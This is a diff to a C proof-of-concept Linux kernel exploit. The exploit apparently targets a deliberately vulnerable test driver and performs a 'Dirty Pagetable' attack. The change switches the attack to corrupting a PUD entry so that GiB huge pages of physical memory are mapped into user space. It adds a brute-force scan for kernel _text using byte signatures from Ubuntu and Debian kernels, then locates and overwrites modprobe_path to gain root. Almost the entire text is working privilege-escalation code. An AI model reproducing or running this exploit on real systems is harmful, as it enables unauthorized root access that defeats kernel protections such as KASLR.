@@ -9,12 +9,11 @@
  *   - CONFIG_SLAB_BUCKETS
  *   - CONFIG_RANDOM_KMALLOC_CACHES
  *
- * This PoC performs the Dirty Pagetable attack and gains LPE.
+ * This PoC performs the Dirty Pagetable attack via huge pages and gains LPE.
  *
  * Requirements:
  *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
- *  2) Disable KASLR and update the MODPROBE_PATH_ADDR below
- *  3) See "Kernel code" in /proc/iomem and update KERNEL_TEXT_PHYS_ADDR
+ *  2) Ensure that KERNEL_TEXT_PATTERNS contains the first bytes of _text of your kernel
  */
 
 #define _GNU_SOURCE
@@ -28,6 +27,7 @@
 #include <sched.h>
 #include <sys/user.h>
 #include <sys/mman.h>
+#include <sys/sysinfo.h>
 #include <sys/socket.h>
 #include <sys/wait.h>
 #include <linux/if_alg.h>
@@ -115,8 +115,11 @@ int act(int act_fd, int code, int n, char *args)
 
 #define PT_ENTRIES (PAGE_SIZE / 8)
 
-/* Page table bits: Dirty | Accessed | User | Write | Present */
-#define PT_BITS 0x67lu
+/* From include/linux/huge_mm.h */
+#define PUD_SIZE (1UL << 30)
+
+/* Page table bits: Huge | Dirty | Accessed | User | Write | Present */
+#define PT_BITS 0xe7lu
 
 #define PGD_N 64
 
@@ -129,31 +132,21 @@ int prepare_page_tables(void)
 
 	printf("[!] preparing page tables\n");
 
-	/* Allocate page table hierarchy */
-	addr = mmap(PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0), PAGE_SIZE, PROT_WRITE,
-			  MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-	if (addr == MAP_FAILED) {
-		perror("[-] mmap");
-		return EXIT_FAILURE;
-	}
-	printf("[+] mmap 1: %p\n", addr);
-	*addr = MAGIC_VAL;
-
 	/*
-	 * Prepare the resources for PTE that will later reclaim
+	 * Prepare the resources for PUD that will later reclaim
 	 * the freed slab containing UAF object.
 	 */
 	for (i = 0; i < PT_ENTRIES; i++) {
-		addr = mmap(PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0), PAGE_SIZE, PROT_WRITE,
+		addr = mmap(PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0), PAGE_SIZE, PROT_WRITE,
 			    MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 		if (addr == MAP_FAILED) {
 			perror("[-] mmap");
 			return EXIT_FAILURE;
 		}
 	}
-	printf("[+] mmap 2: from %p to %p\n",
-			PT_INDICES_TO_VIRT(PGD_N, 0, 1, 0, 0),
-			PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0));
+	printf("[+] mmap one KiB in each PUD entry: from %p to %p\n",
+			PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0),
+			PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0));
 
 	return EXIT_SUCCESS;
 }
@@ -206,14 +199,30 @@ int flush_tlb(void *addr, size_t len)
 	return EXIT_SUCCESS;
 }
 
-/* Update the address of modprobe_path for your kernel: */
-#define MODPROBE_PATH_ADDR 0xffffffff835ccc60lu
-#define KERNEL_TEXT_ADDR 0xffffffff81000000lu
-#define MODPROBE_PATH_ADDR_OFFSET (MODPROBE_PATH_ADDR - KERNEL_TEXT_ADDR)
-/* See "Kernel code" in /proc/iomem to update KERNEL_TEXT_PHYS_ADDR for your kernel */
-#define KERNEL_TEXT_PHYS_ADDR 0x1000000lu
-#define MODPROBE_PATH_PHYS_ADDR (KERNEL_TEXT_PHYS_ADDR + MODPROBE_PATH_ADDR_OFFSET)
-#define MODPROBE_PATH_PTE_ENTRY ((MODPROBE_PATH_PHYS_ADDR & 0xfffffffffffff000lu) + PT_BITS)
+/*
+ * Overwrite one entry in PUD, which reclaimed the UAF memory.
+ * This entry will point to a GiB huge page.
+ * Then perform a massive TLB flush.
+ */
+int pud_write(unsigned long phys_addr, long uaf_n, int act_fd)
+{
+	unsigned long pud_entry_val = phys_addr + PT_BITS;
+	char act_args[DRILL_ACT_SIZE] = { 0 };
+	int ret = EXIT_FAILURE;
+
+	printf("[!] writing 0x%lx to PUD (will point to phys addr range 0x%lx-0x%lx)\n",
+	       pud_entry_val, phys_addr, phys_addr + PUD_SIZE);
+
+	/* DRILL_ACT_SAVE_VAL with 0 as 2nd argument starts at the offset 16 */
+	snprintf(act_args, sizeof(act_args), "0x%lx 0", pud_entry_val);
+	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, act_args);
+	if (ret == EXIT_FAILURE)
+		return EXIT_FAILURE;
+	printf("[+] DRILL_ACT_SAVE_VAL\n");
+
+	ret = flush_tlb(PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0), PT_ENTRIES * PUD_SIZE);
+	return ret;
+}
 
 /* From include/linux/kmod.h */
 #define KMOD_PATH_LEN 256
@@ -257,12 +266,65 @@ int get_modprobe_path(char *buf, size_t buf_size)
 	return EXIT_SUCCESS;
 }
 
-void *memmem_modprobe_path(void *memory, size_t memory_size)
+/*
+ * The first 16 bytes of kernel _text. Collected on:
+ *  1. Dozens of v6.x.x defconfig kernels,
+ *  2. Ubuntu 6.12.28, 6.10.11, 6.6.89,
+ *  3. Debian 6.12.25, 6.11.6, 6.1.10.
+ */
+#define KERNEL_TEXT_PATTERNS                                                  \
+	{ "\x49\x89\xf7\x48\x8d\x25\x4e\x3f\xa0\x01\xb9\x01\x01\x00\xc0\x48", \
+	  "\x49\x89\xf7\x48\x8d\x25\x4e\x3f\xa0\x01\x48\x8d\x3d\xef\xff\xff", \
+	  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90", \
+	  "\xfc\x0f\x01\x15\xa0\xdc\x77\x03\xb8\x10\x00\x00\x00\x8e\xd8\x8e", \
+	  "\x48\x8d\x25\x51\x3f\xa0\x01\x48\x8d\x3d\xf2\xff\xff\xff\xb9\x01" }
+
+#define KERNEL_TEXT_PATTERN_LEN 16
+
+int is_kernel_text(void *addr)
+{
+	char *patterns[] = KERNEL_TEXT_PATTERNS;
+	size_t n = sizeof(patterns) / sizeof(char *);
+	size_t i = 0;
+
+	for (i = 0; i < n; i++) {
+		if (memcmp(addr, patterns[i], KERNEL_TEXT_PATTERN_LEN) == 0)
+			return 1;
+	}
+	return 0;
+}
+
+/* Default value from arch/x86/Kconfig */
+#define CONFIG_PHYSICAL_ALIGN 0x200000
+
+void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 {
 	int ret = EXIT_FAILURE;
+	char *start = memory;
+	char *end = start + memory_size;
+	size_t offset = 0;
+	char *kernel_text = NULL;
 	char modprobe_path[KMOD_PATH_LEN] = { 0 };
 	size_t modprobe_path_len = 0;
 	char *modprobe_path_uaddr = NULL;
+
+	/*
+	 * We search for kernel _text first.
+	 * It is always aligned by CONFIG_PHYSICAL_ALIGN.
+	 */
+	printf("[!] searching kernel _text in %p-%p\n", start, end);
+	while (offset < memory_size) {
+		if (is_kernel_text(start + offset)) {
+			kernel_text = start + offset;
+			break;
+		}
+		offset += CONFIG_PHYSICAL_ALIGN;
+	}
+	if (kernel_text == NULL) {
+		printf("[!] kernel _text is not found in this memory region\n");
+		return NULL;
+	}
+	printf("[+] kernel _text is found at %p, now search modprobe_path\n", kernel_text);
 
 	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
 	if (ret == EXIT_FAILURE)
@@ -276,12 +338,12 @@ void *memmem_modprobe_path(void *memory, size_t memory_size)
 	}
 
 	modprobe_path_len = strlen(modprobe_path);
-	modprobe_path_uaddr = memmem(memory, memory_size, modprobe_path, modprobe_path_len);
+	modprobe_path_uaddr = memmem(kernel_text, end - kernel_text, modprobe_path, modprobe_path_len);
 	if (modprobe_path_uaddr == NULL) {
-		printf("[-] modprobe_path is not found in memory pointed by corrupted PTE\n");
+		printf("[!] modprobe_path is not found in this memory region\n");
 		return NULL;
 	}
-	printf("[+] found modprobe_path at %p\n", modprobe_path_uaddr);
+	printf("[+] found modprobe_path candidate at %p\n", modprobe_path_uaddr);
 
 	/* Test overwriting modprobe_path */
 	modprobe_path_uaddr[0] = 'x';
@@ -294,8 +356,9 @@ void *memmem_modprobe_path(void *memory, size_t memory_size)
 	modprobe_path_uaddr[0] = '/';
 
 	if (modprobe_path[0] != 'x') {
-		printf("[-] testing modprobe_path overwriting failed\n");
-		return NULL;
+		printf("[!] modprobe_path overwriting failed, start a new search\n");
+		/* Recursion */
+		return memmem_modprobe_path_bruteforce(modprobe_path_uaddr, end - modprobe_path_uaddr);
 	}
 
 	printf("[+] testing modprobe_path overwriting succeeded\n");
@@ -387,10 +450,20 @@ int main(void)
 	long current_n = 0;
 	long reserved_from_n = 0;
 	long uaf_n = 0;
-	char act_args[DRILL_ACT_SIZE] = { 0 };
 	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
+	unsigned long phys_addr = 0;
+	struct sysinfo info = { 0 };
+	int huge_pages_n = 0;
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
+
+	if (sysinfo(&info) != 0) {
+		perror("[!] sysinfo");
+		goto end;
+	}
+
+	huge_pages_n = (info.totalram * info.mem_unit / 1024 / 1024 + 1023) / 1024;
+	printf("[!] physical memory can be addressed by %d GiB huge pages\n", huge_pages_n);
 
 	ret = prepare_page_tables();
 	if (ret == EXIT_FAILURE)
@@ -481,40 +554,49 @@ int main(void)
 
 	printf("[!] create a page table to reclaim the freed memory\n");
 	for (i = 0; i < PT_ENTRIES; i++) {
-		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
+		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0);
 
-		/* Allocate and populate a new PTE */
+		/* Allocate and populate a new PUD */
 		*addr = MAGIC_VAL;
 	}
-	printf("[+] PTE has been created\n");
+	printf("[+] PUD has been created\n");
 
 	printf("[!] perform uaf write using the dangling reference\n");
-	/*
-	 * Overwrite one entry in PTE, which reclaimed the UAF memory.
-	 * It will point to the page containing modprobe_path.
-	 * DRILL_ACT_SAVE_VAL with 0 as 2nd argument starts at the offset 16.
-	 */
-	snprintf(act_args, sizeof(act_args), "0x%lx 0", MODPROBE_PATH_PTE_ENTRY);
-	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, act_args);
-	if (ret == EXIT_FAILURE)
-		goto end;
-	printf("[+] DRILL_ACT_SAVE_VAL\n");
-
-	ret = flush_tlb(PT_INDICES_TO_VIRT(PGD_N, 0, 1, 0, 0), PT_ENTRIES * PAGE_SIZE);
+	/* Start from the first GiB of physical memory */
+	ret = pud_write(phys_addr, uaf_n, act_fd);
 	if (ret == EXIT_FAILURE)
 		goto end;
 
 	for (i = 0; i < PT_ENTRIES; i++) {
-		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
+		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0);
 		unsigned long val = *addr;
 		char *modprobe_path_uaddr = NULL;
 		size_t new_len = 0;
+		long j = 0;
 
 		if (val == MAGIC_VAL)
 			continue;
 
-		printf("[+] corrupted PTE entry is detected, now search modprobe_path\n");
-		modprobe_path_uaddr = memmem_modprobe_path(addr, PAGE_SIZE);
+		printf("[+] corrupted PUD entry is detected, now search modprobe_path\n");
+		for (j = 0; j < huge_pages_n; j++) {
+			/* Initially, PUD entry points to the first GiB of physical memory */
+			if (j != 0) {
+				/* Let's try the next GiB of physical memory */
+				phys_addr += PUD_SIZE;
+				ret = pud_write(phys_addr, uaf_n, act_fd);
+				if (ret == EXIT_FAILURE)
+					goto end;
+			}
+
+			/*
+			 * pud_write() has added a GiB huge page to the virtual address space.
+			 * Let's scan it to find the kernel _text and then modprobe_path.
+			 */
+			modprobe_path_uaddr = memmem_modprobe_path_bruteforce(addr, PUD_SIZE);
+			if (modprobe_path_uaddr != NULL)
+				break;
+		}
+
 		if (modprobe_path_uaddr == NULL)
 			break;
 
